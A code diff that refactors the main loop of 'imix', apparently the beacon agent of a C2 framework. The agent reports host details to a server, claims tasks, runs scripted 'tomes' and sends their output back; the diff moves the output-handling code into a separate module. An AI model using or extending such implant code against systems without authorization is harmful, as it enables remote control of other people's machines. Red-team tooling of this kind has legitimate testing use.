@@ -1,25 +1,19 @@
 use anyhow::{Context, Error, Result};
 use c2::pb::c2_client::C2Client;
-use c2::pb::{Agent, Beacon, ClaimTasksRequest, Host, ReportTaskOutputRequest, Task, TaskOutput};
+use c2::pb::{Agent, Beacon, ClaimTasksRequest, Host, Task, TaskOutput};
 
-use chrono::{DateTime, Utc};
+use chrono::Utc;
 use clap::{arg, Command};
 use eldritch::{eldritch_run, EldritchPrintHandler};
+use imix::exec::{handle_output_and_responses, AsyncTask};
 use imix::init::agent_init;
+use std::collections::HashMap;
 use std::fs::File;
-use std::sync::mpsc::{channel, Receiver, Sender};
+use std::sync::mpsc::{channel, Sender};
 use std::thread;
 use std::time::Instant;
-use std::collections::HashMap;
-use tokio::task::{self, JoinHandle};
+use tokio::task;
 use tokio::time::Duration;
-
-pub struct AsyncTask {
-    future_join_handle: JoinHandle<Result<(), Error>>,
-    start_time: DateTime<Utc>,
-    grpc_task: Task,
-    print_reciever: Receiver<String>,
-}
 
 async fn handle_exec_tome(
     task: Task,
@@ -137,7 +131,10 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
                     identifier: agent_properties.host_id.clone(),
                     name: agent_properties.hostname.clone(),
                     platform: agent_properties.host_platform.try_into()?,
-                    primary_ip: agent_properties.primary_ip.clone().context("primary ip not found")?,
+                    primary_ip: agent_properties
+                        .primary_ip
+                        .clone()
+                        .context("primary ip not found")?,
                 }),
                 agent: Some(Agent {
                     identifier: agent_properties.agent_id.clone(),
@@ -170,12 +167,14 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
 
             let (sender, receiver) = channel::<String>();
             let exec_with_timeout = handle_exec_timeout_and_response(task.clone(), sender.clone());
+
             #[cfg(debug_assertions)]
             println!(
                 "[{}]: Queueing task {}",
                 (Utc::now().time() - start_time).num_milliseconds(),
                 task.clone().id
             );
+
             match all_exec_futures.insert(
                 task.clone().id,
                 AsyncTask {
@@ -194,6 +193,7 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
                     println!("main_loop: Task queued successfully\n");
                 } // Task queued successfully
             }
+
             #[cfg(debug_assertions)]
             println!(
                 "[{}]: Queued task {}",
@@ -218,10 +218,6 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         // tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await; // This seems to wait for other threads to finish.
         std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601)); // This just sleeps our thread.
 
-        // :clap: :clap: make new map!
-        let mut running_exec_futures: HashMap<i64, AsyncTask> = HashMap::new();
-        let mut running_task_res_map: HashMap<i64, Vec<TaskOutput>> = all_task_res_map.clone();
-
         #[cfg(debug_assertions)]
         println!(
             "[{}]: Checking task status",
@@ -229,116 +225,17 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         );
 
         // Check status & send response
-        for exec_future in all_exec_futures.into_iter() {
-            let task_id = exec_future.0;
-
-            #[cfg(debug_assertions)]
-            println!(
-                "[{}]: Task # {} is_finished? {}",
-                (Utc::now().time() - start_time).num_milliseconds(),
-                task_id,
-                exec_future.1.future_join_handle.is_finished()
-            );
-
-            // If the task doesn't exist in the map add a vector for it.
-            if !running_task_res_map.contains_key(&task_id) {
-                running_task_res_map.insert(task_id.clone(), vec![]);
-            }
-
-            let mut task_channel_output: Vec<String> = vec![];
-
-            // Loop over each line of output from the task and append it the the channel output.
-            loop {
-                #[cfg(debug_assertions)]
-                println!(
-                    "[{}]: Task # {} recieving output",
-                    (Utc::now().time() - start_time).num_milliseconds(),
-                    task_id
-                );
-                let new_res_line = match exec_future
-                    .1
-                    .print_reciever
-                    .recv_timeout(Duration::from_millis(100))
-                {
-                    Ok(local_res_string) => local_res_string,
-                    Err(local_err) => {
-                        match local_err.to_string().as_str() {
-                            "channel is empty and sending half is closed" => {
-                                break;
-                            }
-                            "timed out waiting on channel" => {
-                                break;
-                            }
-                            _ => eprint!("Error: {}", local_err),
-                        }
-                        break;
-                    }
-                };
-                // let appended_line = format!("{}{}", res.to_owned(), new_res_line);
-                task_channel_output.push(new_res_line);
-            }
-
-            let task_is_finished = exec_future.1.future_join_handle.is_finished();
-            let task_response_exec_finished_at = match task_is_finished {
-                true => Some(Utc::now()),
-                false => None,
-            };
-
-            // If the task is finished or there's new data queue a new task result.
-            if task_is_finished || task_channel_output.len() > 0 {
-                let task_response = TaskOutput {
-                    id: exec_future.1.grpc_task.id.clone(),
-                    exec_started_at: Some(prost_types::Timestamp {
-                        seconds: exec_future.1.start_time.timestamp(),
-                        nanos: exec_future.1.start_time.timestamp_subsec_nanos() as i32,
-                    }),
-                    exec_finished_at: match task_response_exec_finished_at {
-                        Some(timestamp) => Some(prost_types::Timestamp {
-                            seconds: timestamp.timestamp(),
-                            nanos: timestamp.timestamp_subsec_nanos() as i32,
-                        }),
-                        None => None,
-                    },
-                    output: task_channel_output.join("\n"),
-                    error: None,
-                };
-
-                let mut tmp_res_list = running_task_res_map
-                    .get(&task_id)
-                    .context("Failed to get task output by ID")?
-                    .clone();
-                tmp_res_list.push(task_response);
-                running_task_res_map.insert(task_id.clone(), tmp_res_list);
-            }
-
-            // Only re-insert the still running exec futures
-            if !exec_future.1.future_join_handle.is_finished() {
-                running_exec_futures.insert(task_id, exec_future.1);
-            }
-        }
-
-        // Iterate over queued task results and send them back to the server
-        for (task_id, task_res) in running_task_res_map.clone().into_iter() {
-            for output in task_res {
-                let req = tonic::Request::new(ReportTaskOutputRequest {
-                    output: Some(output),
-                });
-                match tavern_client.report_task_output(req).await {
-                    Ok(_) => {
-                        running_task_res_map.remove(&task_id);
-                    }
-                    Err(local_err) => {
-                        #[cfg(debug_assertions)]
-                        println!("Failed to submit task resluts:\n{}", local_err.to_string());
-                        {}
-                    }
-                }
-            }
-        }
+        let res = handle_output_and_responses(
+            start_time,
+            tavern_client,
+            all_exec_futures.into_iter(),
+            all_task_res_map.clone(),
+        )
+        .await?;
 
         // change the reference! This is insane but okay.
-        all_exec_futures = running_exec_futures;
-        all_task_res_map = running_task_res_map.clone();
+        all_exec_futures = res.0;
+        all_task_res_map = res.1.clone();
 
         // Debug loop tracker
         #[cfg(debug_assertions)]
@@ -401,12 +298,10 @@ mod tests {
     use super::*;
     use c2::pb::ClaimTasksResponse;
 
-    #[test]
-    fn imix_handle_exec_tome() {
-        let server_response = tonic::Response::new(ClaimTasksResponse {
-            tasks: todo!(),
-        });
-    }
+    // #[test]
+    // fn imix_handle_exec_tome() {
+    //     let server_response = tonic::Response::new(ClaimTasksResponse { tasks: todo!() });
+    // }
 
     //     #[test]
     //     fn imix_handle_exec_tome() {
